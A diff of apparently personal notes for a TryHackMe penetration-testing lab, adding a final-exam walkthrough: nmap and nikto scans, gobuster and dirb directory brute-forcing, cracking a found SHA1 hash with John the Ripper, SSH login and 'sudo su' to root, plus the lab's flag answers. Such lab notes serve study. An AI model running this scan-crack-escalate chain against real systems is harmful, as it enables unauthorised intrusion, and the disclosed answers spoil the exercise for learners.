@@ -364,8 +364,8 @@ hello
 - Crack this hash: 5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8
 Type: SHA1
 hint: echo 5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8 > hash2.txt
-john hash2.txt --wordlist=/home/gd/Downloads/rockyou.txt --format=raw-sh1
-john hash2.txt --show --format=raw-sh1
+john hash2.txt --wordlist=/home/gd/Downloads/rockyou.txt --format=raw-sha1
+john hash2.txt --show --format=raw-sha1
 password
 
 
@@ -439,13 +439,27 @@ found_me
 #Task 24 [Section 7 - Final Exam]: Good Luck :D 
 - What is the user.txt
 hint: nmap -sSCV -p- -vv --script=vuln -oA output.txt $IP
+nikto -h $IP  #best scan
+.../secret
 gobuster dir -u $IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 gobuster dir -u http://$IP/secret -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 or gobuster dir -u http://$IP/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 64 -q /secret
+or dirb http://10.10.114.27/secret /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -X .txt,.php,.html
+other wordlist dirb http://10.10.114.27/secret /usr/share/wordlists/dirb/common.txt -X .txt,.php,.html
+
+http://10.10.114.27/secret/secret.txt
+nyan:046385855FC9580393853D8E81F240B66FE9A7B8
+vi hash
+john hash --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-sha1
+nyan
 
 
 - What is the root.txt
-
+hint:ssh nyan@10.10.114.27
+sudo -l
+sudo su
+cat user.txt
+supernootnoot
 
 https://docplayer.net/198613531-Tryhackme-cc-pen-testing-completed-winter-2020.html
 https://fieldraccoon.github.io/misc%20posts%20not%20released%20yet/priv-esc-pre-writeup/
